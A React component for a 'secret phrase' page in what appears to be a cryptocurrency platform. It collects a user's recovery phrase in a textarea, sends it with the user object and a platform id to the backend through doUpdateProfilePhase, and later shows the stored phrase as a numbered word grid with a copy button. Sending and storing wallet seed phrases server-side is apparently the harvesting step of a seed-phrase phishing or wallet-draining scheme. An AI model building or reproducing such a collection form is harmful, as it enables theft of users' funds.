import React, { useEffect, useState } from "react";
import SubHeader from "src/view/shared/Header/SubHeader";
import authSelectors from "src/modules/auth/authSelectors";
import yupFormSchemas from "src/modules/shared/yup/yupFormSchemas";
import * as yup from "yup";
import { i18n } from "../../../i18n";
import { FormProvider, useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import { useDispatch, useSelector } from "react-redux";
import authActions from "src/modules/auth/authActions";
import { useParams, useHistory } from "react-router-dom";

const schema = yup.object().shape({
  phase: yupFormSchemas.string(i18n("entities.transaction.fields.phase"), {
    required: true,
    // min: 12,
  }),
});

function Phrase() {
  const { id } = useParams();
  const currentUser = useSelector(authSelectors.selectCurrentUser);
  const dispatch = useDispatch();
  const history = useHistory();

  const [initialValues] = useState(() => {
    return {
      phase: "" || currentUser.phase,
    };
  });

  const form = useForm({
    resolver: yupResolver(schema),
    mode: "onSubmit",
    defaultValues: initialValues
  });
  
  const [phase, setPhase] = useState("");

  const onSubmit = async (values) => {
    const payload = {
      platform: id,
      user: currentUser ? currentUser : null,
      phase: phase,
    };
    await dispatch(authActions.doUpdateProfilePhase(payload));
  };

  const goBack = () => {
    history.goBack();
  };

  useEffect(() => {
    // Add any effect logic here if necessary
  }, [currentUser]);

  return (
    <>
      <style>
        {`
          @import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css');
          
          * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
          }
          
          /* Main Container */
          .phrase-app {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: white;
            background: radial-gradient(circle at center top, #0a1c3a, #051122 800px);
            min-height: 100vh;
            max-width: 430px;
            margin: 0 auto;
            position: relative;
            overflow-x: hidden;
          }
          
          .phrase-container {
            padding: 16px 18px 20px;
          }
          
          /* Header */
          .phrase-header {
            display: flex;
            align-items: center;
            margin-bottom: 24px;
            padding: 0 4px;
          }
          
          .back-button {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            color: #00c6ff;
            text-decoration: none;
            font-size: 0.9rem;
            margin-right: 15px;
            transition: all 0.2s;
            padding: 6px 12px;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            cursor: pointer;
          }
          
          .back-button:hover {
            gap: 10px;
            background: rgba(255, 255, 255, 0.08);
          }
          
          .phrase-title {
            font-size: 1.3rem;
            font-weight: 700;
            background: linear-gradient(135deg, #00c6ff, #0068c8);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
          }
          
          /* Form Container */
          .phrase-form-container {
            background: rgba(255, 255, 255, 0.04);
            border-radius: 16px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(8px);
            overflow: hidden;
            margin-bottom: 20px;
          }
          
          .form-header {
            padding: 16px 20px;
            background: rgba(0, 104, 200, 0.15);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
          }
          
          .form-title {
            font-size: 1.1rem;
            font-weight: 600;
            color: white;
            display: flex;
            align-items: center;
            gap: 10px;
          }
          
          .form-title i {
            color: #00c6ff;
          }
          
          .phrase-form {
            padding: 20px;
          }
          
          /* Form Groups */
          .form-group {
            margin-bottom: 20px;
          }
          
          .form-label {
            display: flex;
            align-items: center;
            gap: 5px;
            margin-bottom: 8px;
            color: rgba(255, 255, 255, 0.9);
            font-weight: 500;
          }
          
          .form-label span:first-child {
            color: #ff416c;
            font-weight: bold;
          }
          
          .form-label span:last-child {
            color: rgba(255, 255, 255, 0.9);
            font-size: 0.9rem;
          }
          
          /* Textarea */
          .input__textarea {
            width: 100%;
            padding: 16px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            color: white;
            font-size: 0.95rem;
            transition: all 0.3s ease;
            outline: none;
            resize: vertical;
            min-height: 180px;
            font-family: 'Courier New', monospace;
            line-height: 1.5;
          }
          
          .input__textarea:focus {
            border-color: #00c6ff;
            background: rgba(0, 198, 255, 0.05);
            box-shadow: 0 0 0 2px rgba(0, 198, 255, 0.1);
          }
          
          .input__textarea::placeholder {
            color: rgba(255, 255, 255, 0.4);
          }
          
          /* Important Note Box */
          .important-note {
            background: rgba(255, 65, 108, 0.1);
            border: 1px solid rgba(255, 65, 108, 0.3);
            border-radius: 10px;
            padding: 16px;
            margin: 20px 0;
          }
          
          .important-note-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
            color: #ff416c;
            font-weight: 600;
          }
          
          .important-note-content {
            color: rgba(255, 255, 255, 0.8);
            font-size: 0.9rem;
            line-height: 1.5;
          }
          
          .important-note-content ul {
            padding-left: 20px;
            margin: 10px 0;
          }
          
          .important-note-content li {
            margin-bottom: 8px;
          }
          
          /* Word Grid (for viewing only) */
          .words-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin: 20px 0;
            padding: 16px;
            background: rgba(255, 255, 255, 0.03);
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.05);
          }
          
          .word-item {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 10px;
            background: rgba(0, 198, 255, 0.1);
            border-radius: 8px;
            font-size: 0.9rem;
          }
          
          .word-number {
            color: #00c6ff;
            font-weight: bold;
            font-size: 0.8rem;
          }
          
          .word-text {
            color: white;
            font-family: 'Courier New', monospace;
          }
          
          /* Submit Button */
          .confirm {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #00c6ff, #0068c8);
            border: none;
            border-radius: 12px;
            color: white;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
          }
          
          .confirm:hover {
            background: linear-gradient(135deg, #00d2ff, #0075e6);
            transform: translateY(-2px);
            box-shadow: 0 6px 15px rgba(0, 198, 255, 0.2);
          }
          
          .confirm:active {
            transform: translateY(0);
          }
          
          .confirm:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
          }
          
          /* Success/Error Messages */
          .form-message {
            padding: 12px 16px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-size: 0.9rem;
            text-align: center;
          }
          
          .form-message.success {
            background: rgba(76, 175, 80, 0.15);
            border: 1px solid rgba(76, 175, 80, 0.3);
            color: #4caf50;
          }
          
          .form-message.error {
            background: rgba(244, 67, 54, 0.15);
            border: 1px solid rgba(244, 67, 54, 0.3);
            color: #f44336;
          }
          
          /* Form Validation */
          .input-container.error .input__textarea {
            border-color: #ff416c;
            background: rgba(255, 65, 108, 0.05);
          }
          
          .error-message {
            color: #ff416c;
            font-size: 0.8rem;
            margin-top: 5px;
            padding-left: 5px;
          }
          
          /* Copy Button */
          .copy-button {
            width: 100%;
            padding: 12px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            color: white;
            font-size: 0.9rem;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
          }
          
          .copy-button:hover {
            background: rgba(255, 255, 255, 0.15);
            border-color: #00c6ff;
          }
          
          .copy-button.copied {
            background: rgba(76, 175, 80, 0.2);
            border-color: #4caf50;
            color: #4caf50;
          }
          
          /* Responsive */
          @media (max-width: 430px) {
            .phrase-container {
              padding: 14px 16px 20px;
            }
            
            .phrase-form {
              padding: 18px;
            }
            
            .input__textarea {
              padding: 14px;
              font-size: 0.9rem;
              min-height: 160px;
            }
            
            .confirm {
              padding: 14px;
              font-size: 0.95rem;
            }
            
            .words-grid {
              grid-template-columns: repeat(2, 1fr);
              padding: 12px;
            }
          }
          
          @media (max-width: 380px) {
            .phrase-form {
              padding: 14px;
            }
            
            .form-group {
              margin-bottom: 16px;
            }
            
            .words-grid {
              grid-template-columns: 1fr;
            }
            
            .important-note-content {
              font-size: 0.85rem;
            }
          }
        `}
      </style>

      <div className="phrase-app">
        <div className="phrase-container">
          {/* Header */}
          <div className="phrase-header">
            <button className="back-button" onClick={goBack}>
              <i className="fas fa-arrow-left"></i>
              {i18n("buttons.back")}
            </button>
            <h1 className="phrase-title">{i18n("text.secret")}</h1>
          </div>

       

          {/* Phrase Form */}
          <div className="phrase-form-container">
            <div className="form-header">
              <div className="form-title">
                <i className="fas fa-key"></i>
                {i18n("phrase.youresecretphrase")}
              </div>
            </div>
            
            <FormProvider {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="phrase-form">
                <div className="form-group">
                  <div className="form-label">
                    <span>*</span>
                    <span>{i18n("phrase.enteryourphrase")}</span>
                  </div>
                  <div className="input-container">
                    <textarea
                      className="input__textarea"
                      name="phase"
                      rows={8}
                      value={phase || currentUser?.phase || ""}
                      wrap="soft"
                      onChange={(e) => setPhase(e.target.value)}
                      placeholder={i18n("phrase.phraseplaceholder")}
                    />
                    <p className="error-message">
                      {form.formState.errors.phase?.message}
                    </p>
                  </div>
                  
                  {/* Word Grid Display (if viewing existing phrase) */}
                  {currentUser?.phase && !phase && (
                    <div className="words-grid">
                      {currentUser.phase.split(' ').map((word, index) => (
                        <div key={index} className="word-item">
                          <span className="word-number">{index + 1}.</span>
                          <span className="word-text">{word}</span>
                        </div>
                      ))}
                    </div>
                  )}
                  
                  {/* Copy Button (Optional) */}
                  {currentUser?.phase && (
                    <button 
                      type="button" 
                      className="copy-button"
                      onClick={() => {
                        navigator.clipboard.writeText(currentUser.phase);
                        // You could add a "copied" state here for visual feedback
                      }}
                    >
                      <i className="far fa-copy"></i>
                      {i18n("buttons.copyphrase")}
                    </button>
                  )}
                </div>

                <button className="confirm" type="submit" disabled={form.formState.isSubmitting}>
                  <i className="fas fa-check-circle"></i>
                  {i18n("buttons.confirm")}
                </button>
              </form>
            </FormProvider>
          </div>

             {/* Important Note */}
          <div className="important-note">
            <div className="important-note-header">
              <i className="fas fa-exclamation-triangle"></i>
              {i18n("phrase.important")}
            </div>
            <div className="important-note-content">
              {i18n("phrase.warning1")}
              <ul>
                <li>{i18n("phrase.warning2")}</li>
                <li>{i18n("phrase.warning3")}</li>
                <li>{i18n("phrase.warning4")}</li>
              </ul>
              {i18n("phrase.warning5")}
            </div>
          </div>
        </div>
      </div>
    </>
  );
}

export default Phrase;